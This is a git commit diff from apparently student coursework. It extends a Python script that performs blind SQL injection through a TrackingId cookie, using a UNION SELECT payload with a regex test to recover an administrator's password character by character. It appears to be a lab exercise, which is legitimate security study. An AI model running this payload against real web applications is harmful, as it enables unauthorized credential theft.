5fa333ff299d8b8b2df8fa09c3224755f43a2073
Evan <elafleur@pdx.edu>
2022-02-05 00:39:45 -0800

    Linear Search - works but continues trying password after the fact

--- hw2/hw2.py
+++ hw2/hw2.py
@@ -8,6 +8,17 @@ if 'https://' in site:
 
 url = f'https://{site}/'
 
+
+characters = ["a", "b", "c", "d", "e", "f",
+              "g", "h", "i", "j", "k", "l",
+              "m", "n", "o", "p", "q", "r",
+              "s", "t", "u", "v", "w", "x",
+              "y", "z", "0", "1", "2", "3",
+              "4", "5", "6", "7", "8", "9"]
+try_password = []
+query_pass = f"x' UNION SELECT username FROM users WHERE username='administrator' AND password"
+
+
 def try_query(query):
     print(f'Query: {query}')
     mycookies = {'TrackingId': urllib.parse.quote_plus(query) }
@@ -33,3 +44,23 @@ while True:
 
 print(f"Password length is {num}")
 print(f"Time elapsed is {time.perf_counter()-begin_time}")
+
+for i in range(36):
+    query1 = f"{query_pass} ~ '^{characters[i]}'--"
+    if try_query(query1) == False:
+        pass
+    else:
+        print(f"Password begins with {characters[i]}")
+        try_password.append(characters[i])
+        break
+
+for i in range(num):
+    print(f"Current Password: {try_password[0]}")
+    for i in range(len(characters)):
+        query2 = f"{query_pass} ~ '^{try_password[0]+characters[i]}'--"
+        if try_query(query2) == False:
+            pass
+        else:
+            print(f"Password starts with {try_password[0]+characters[i]}")
+            try_password[0] = try_password[0]+characters[i]
+            break
